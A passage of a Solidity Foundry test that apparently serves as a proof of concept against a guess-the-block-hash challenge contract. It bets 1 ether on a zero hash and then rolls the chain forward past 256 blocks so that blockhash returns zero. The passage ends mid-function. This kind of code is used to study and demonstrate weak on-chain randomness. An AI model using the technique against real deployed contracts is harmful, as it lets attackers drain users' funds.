    function test_highlightPredictableRandomValue(uint256 startBlockNumber) public {
        // Constrain the symbolic blockNumber to avoid overflows and edge cases
        vm.assume(startBlockNumber > 10);
        vm.assume(startBlockNumber < type(uint256).max - 300);

        // Fix the block environment
        vm.roll(startBlockNumber);

        // Record our balance before interacting (after funding the challenge pot)
        uint256 balanceBefore = address(this).balance;

        // We "predict" that after >256 blocks, blockhash for the guess block will be zero
        bytes32 predictedAnswer = bytes32(0);

        // Lock in our guess for block.number + 1 with a 1 ether bet
        _contractUnderTest.lockInGuess{value: 1 ether}(predictedAnswer);

        // The guess is for block `startBlockNumber + 1`
        uint256 guessBlock = startBlockNumber + 1;

        // Advance the chain so that `guessBlock` is more than 256 blocks old
        uint256 targetBlock = startBlockNumber + 300;
        vm.roll(targetBlock);

        // Locally mirror the on-chain "randomness" logic
